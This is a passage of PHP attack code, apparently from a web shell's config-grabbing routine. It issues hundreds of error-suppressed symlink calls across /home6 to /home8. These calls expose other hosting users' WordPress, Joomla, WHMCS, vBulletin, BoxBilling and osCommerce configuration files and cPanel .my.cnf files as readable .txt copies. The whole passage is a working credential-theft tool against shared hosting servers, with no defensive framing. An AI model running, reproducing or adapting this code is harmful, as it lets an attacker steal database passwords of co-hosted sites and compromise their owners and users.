    @symlink('/home6/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home6/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home6/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //home 7 
    
    @symlink('/home7/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home7/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home7/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home7/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home7/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home7/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home7/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home7/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
    @symlink('/home7/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
    @symlink('/home7/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
    @symlink('/home7/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
    @symlink('/home7/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
    
    //home 8 
    
    @symlink('/home8/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
    @symlink('/home8/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
    @symlink('/home8/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
    @symlink('/home8/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
    @symlink('/home8/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
    @symlink('/home8/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
    @symlink('/home8/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
    @symlink('/home8/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
